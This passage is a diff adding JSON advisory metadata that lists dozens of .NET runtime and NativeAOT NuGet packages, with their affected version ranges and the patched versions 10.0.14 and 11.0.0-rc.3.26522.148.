+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.iossimulator-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.iossimulator-x64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.maccatalyst-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.maccatalyst-x64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.multithread.browser-wasm",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.tvos-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.tvossimulator-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.tvossimulator-x64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.wasi-wasm",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.android-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.android-x64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-arm",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-bionic-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-bionic-x64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-musl-arm",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-musl-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-musl-x64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-x64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.osx-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.osx-x64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.win-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.win-x64",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.win-x86",
+          "ecosystem": "nuget",
+          "range": ">= 10.0.0, < 10.0.14",
+          "patched": "10.0.14"
+        },
+        {
+          "package": "Microsoft.DotNet.ILCompiler",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.android-arm",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.android-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.android-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.ios-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-arm",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-arm",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.linux-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.osx-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.osx-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.tvos-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.win-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.win-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.NativeAOT.win-x86",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1.26104.118, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.android-arm",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.android-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.android-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.android-x86",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.browser-wasm",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.ios-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.iossimulator-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.iossimulator-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.maccatalyst-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.maccatalyst-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.multithread.browser-wasm",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.tvos-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.tvossimulator-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.tvossimulator-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.Mono.wasi-wasm",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.android-arm",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.android-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.android-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.browser-wasm",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.ios-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.iossimulator-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.iossimulator-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-arm",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-bionic-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-bionic-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-musl-arm",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-musl-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-musl-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.linux-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.maccatalyst-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.maccatalyst-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.osx-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.osx-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.tvos-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.tvossimulator-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.tvossimulator-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.win-arm64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.win-x64",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        },
+        {
+          "package": "Microsoft.NETCore.App.Runtime.win-x86",
+          "ecosystem": "nuget",
+          "range": ">= 11.0.0-preview.1, < 11.0.0-rc.3.26522.148",
+          "patched": "11.0.0-rc.3.26522.148"
+        }
+      ]
+    }
+  ]
+}
